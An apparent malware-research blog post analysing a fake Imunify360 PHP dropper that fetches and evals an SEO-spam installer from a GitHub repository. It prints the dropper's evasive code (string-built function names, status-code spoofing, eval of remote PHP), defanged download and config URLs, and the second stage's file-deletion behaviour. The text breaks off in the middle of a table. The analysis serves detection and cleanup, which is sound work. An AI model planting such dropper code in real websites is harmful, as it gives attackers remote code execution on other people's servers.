---
title: Fake Imunify360 Dropper Loads an SEO Spam Installer From a Public GitHub Repo
url: https://lukeleal.com/research/posts/fake-imunify360-github-seo-spam-dropper/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:24.042591
---

# Fake Imunify360 Dropper Loads an SEO Spam Installer From a Public GitHub Repo

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [Fake Imunify360 Dropper Loads an SEO Spam Installer From a Public GitHub Repo](https://lukeleal.com/research/posts/fake-imunify360-github-seo-spam-dropper/)

2024-01-29Luke

#[imunify360](https://lukeleal.com/research/tags/imunify360/)
#[dropper](https://lukeleal.com/research/tags/dropper/)
#[github](https://lukeleal.com/research/tags/github/)
#[seo spam](https://lukeleal.com/research/tags/seo-spam/)
#[doorway](https://lukeleal.com/research/tags/doorway/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![Fake Imunify360 Dropper Loads an SEO Spam Installer From a Public GitHub Repo](https://lukeleal.com/research/fake-imunify-cover-q90.jpg "Cover Image")

## Table of Contents

* [Stage 1: The Dropper](#stage-1-the-dropper)
  + [Building the function names](#building-the-function-names)
* [Stage 2: ff.php](#stage-2-ffphp)
  + [What ff.php does](#what-ffphp-does)
* [The Dropper’s Unused Constant](#the-droppers-unused-constant)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Samples](#samples)

This dropper is named after a real hosting security product, **Imunify360**, which a lot of shared hosts run to scan for malware. The attacker uses the name on the function and in a setting, so the file looks like part of the host’s security stack. It isn’t. All it does is download PHP from GitHub and run it.

The interesting part is what it downloads. The GitHub repo is still public, so I could read the whole second stage. This post covers both.

## Stage 1: The Dropper[#](#stage-1-the-dropper)

The dropper is a single `index.php`. Here are the first lines:

```
<?=
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);
```

What I can say about each line:

* **`<?=` is the short echo tag**, so this line *prints* the return value of `error_reporting(0)`, which is the previous error level. I ran the line and it prints a stray number (`30719` in my test) at the top of the page. It’s a sloppy tell: the output of a “missing” page starts with a number.
* `error_reporting(0)` hides all PHP errors, including any from the code that follows.
* `X-Powered-By: none` removes the PHP version header.
* The status code is set to `403` and then immediately to `404`, so the **last one wins**. The goal is for anything that checks the HTTP status (a scanner, a monitoring tool, a crawler) to see a missing page while the payload runs. This only works if PHP output buffering is on. I tested the same lines on a local PHP server: with `output_buffering=4096` (a common production default) the response was a **404**, but with `output_buffering=0` the stray number from the `<?=` line is sent first, the `header()` calls silently fail, and the response stays **200**. So the trick is host dependent.
* `lsapi_backend_off` and `imunify360.cleanup_on_restore` are the two settings I couldn’t verify. I searched for both and found no documentation for either. They look like attempts to interfere with LiteSpeed or Imunify360 behavior, but I can’t tell you what they actually do, and they may do nothing. I’d treat them as part of the camouflage.

### Building the function names[#](#building-the-function-names)

The rest of the file is a download function named `imunify()`. It avoids ever writing the names of the functions it needs:

```
$fpn = "f"."o"."p"."e"."n";
$strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
```

A scanner that looks for `file_get_contents(` or `curl_exec(` won’t see them, because the strings only exist after PHP joins them at runtime. It tries cURL first, then `file_get_contents`, then `fopen` + `stream_get_contents`, so it works on hosts that disable some of these.

Finally it fetches and runs the payload:

```
$secure = imunify('hxxps://raw[.]githubusercontent[.]com/35ww3qq/7667/refs/heads/main/ff.php');
eval('?>' . $secure);
```

Starting the eval’d string with `?>` drops out of PHP mode first, so the payload can be written like a normal PHP file, with its own `<?php` tag.

There’s no cookie, key, or allow-list check. The payload is fetched and run on **every request** to this file, and the cURL call has no timeout. If GitHub is unreachable the request just hangs. Compare this with the [dead drop loaders](https://lukeleal.com/research/posts/dead-drop-loaders-github-bsc-etherhiding/) I wrote up earlier: there, the moving part was a one-line URL file. Here it’s the whole second stage, hosted on GitHub.

## Stage 2: ff.php[#](#stage-2-ffphp)

As of 2026-10-24 the repo `35ww3qq/7667` and the `ff.php` file are both **still live**. I downloaded the file as text into an empty folder and read it without running it. I did not contact any of the attacker’s other servers.

The repo itself says more than the file does:

* The GitHub account `35ww3qq` was created in April 2024 and has 12 public repos and no followers. The `7667` repo was created on **2024-11-14**, and was last pushed on **2025-01-03**.
* Besides `ff.php`, the repo has `a.php`, `gh1.txt`, `vv.txt`, and a full web application: `login.php`, `register.php`, `forgot-password.php`, `reset-password.php`, `logout.php`, a `panel/` folder, a `cron/` folder, and a `database.sql` file. Registration and password reset pages suggest a multi-user control panel. I didn’t dig into it.
* There’s also a 103 KB `error_log` file committed to the repo. I haven’t opened it. Logs like that often contain details about real servers, so anyone who does should handle it with care.

### What ff.php does[#](#what-ffphp-does)

**Housekeeping.** It reads the optional query parameters (`q`, `tm`, `root`), then deletes files that might expose the infection or help the owner: `robots.txt`, `sitemap.xml`, `error_log`, `ads.txt`, and any `google*.html` verification file. Those last ones are what you’d use to prove site ownership to Google.

A plain request with no `q` parameter doesn’t run anything. It prints a single link and exits:

```
<a href="?q=2&t=<unix time>">DB_auto11.</a>
```

That `DB_auto11.` link is a handy fingerprint. If you load a suspicious file and it shows only that, you’ve found the installer.

**Getting its config.** It requests a URL built from `chr()` calls, spoofing a Bing crawler user-agent:

```
$uc = urla(chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(97)...'W.php');
```

Decoded, that is `hxxp://auto1022[.]dataablog[.]com/_api_auto_241206_W.php`. The `241206` looks like a date stamp (2024-12-06), but that’s a guess. The response has to be longer than 999 characters and contain a semicolon, otherwise the script tries to delete itself and prints `Auto_Failure`. It is then split on `;` into a list. From the code, the list is used like this:

| Slot | Use |
| --- | --- |
| 0 | base64 `.htaccess` |
| 1 | URL of an extra file to download |
| 3 | base64 P...